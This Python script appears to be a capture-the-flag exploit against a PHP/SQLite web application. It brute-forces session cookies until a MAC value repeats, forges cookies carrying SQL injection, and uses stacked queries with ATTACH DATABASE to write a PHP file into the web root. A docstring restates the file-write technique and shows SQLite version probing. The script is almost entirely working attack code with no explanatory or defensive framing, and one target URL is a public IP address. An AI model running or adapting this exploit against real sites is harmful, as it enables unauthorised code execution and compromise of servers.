import httpx
from urllib.parse import unquote, quote
from collections import Counter

URL = "http://65.108.176.96:8888/"
URL = "http://127.0.0.1:8888/"

client = httpx.Client(http2=True)

cnt = Counter()
for i in range(512):
    del client.cookies['session']  # delete cookies to get new sess
    r = client.get(URL)

    # DEBUG
    idx = r.content.find(b"CRYPT(")
    print(r.content[idx : idx + 40])

    if r.status_code == 200:
        cookie = unquote(r.headers['set-cookie'][len('session='):])
        uid, mac = cookie.split("|")
        cnt[mac] += 1
        if cnt.most_common(1)[0][1] > 1:  # count(most_common) > 1
            break

MAC, _ = cnt.most_common(1)[0]
print(f'Found MAC: {MAC}')

"""
ATTACH DATABASE '/tmp/shell.php' as kal;
CREATE TABLE kal.mar (code TEXT);
INSERT INTO kal.mar (code) VALUES ('<?php phpinfo();?>');

sqlite> SELECT sqlite_version();
3.35.5
substr(sqlite_version(), 1, 1) = '3'
3
sqlite> SELECT substr(sqlite_version(), 1, 2);
3.
sqlite> SELECT substr(sqlite_version(), 1, 3);
3.3
sqlite> SELECT substr(sqlite_version(), 2, 1);
.
"""

def sqli(stmt):
    for permutation in range(512):
        # SELECT name FROM user WHERE id = <sqli>
        #sqli = f"0 AND ({stmt} OR {permutation} = -{permutation})"
        sqli = f"0 AND {stmt} -- {permutation}"

        client.cookies['session'] = quote(f'{sqli}|{MAC}')
        r = client.post(URL, data={'content': 'A'})
        if r.status_code == 302:
            print(f'Found good permutation: {sqli}')
            r = client.get(URL)
            print(r)
            print(r.content)
            break

for permutation in range(512):
    # DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}
    sqli = f"-{permutation}"
    sqli += "; ATTACH DATABASE '/var/www/html/data/591c34a8d9b5c628544c9583aea59e21/kal123mer.php' as kal; CREATE TABLE kal.mar (code TEXT); INSERT INTO kal.mar (code) VALUES ('<?php phpinfo();?>');"
    sqli += "DELETE from entry WHERE 12343"

    client.cookies['session'] = quote(f'{sqli}|{MAC}')
    r = client.post(URL, data={'delete': '1'})
    if r.status_code == 302:
        print(f'Found good permutation: {sqli}')
        #r = client.get(URL)
        #print(r)
        #print(r.content)
        break
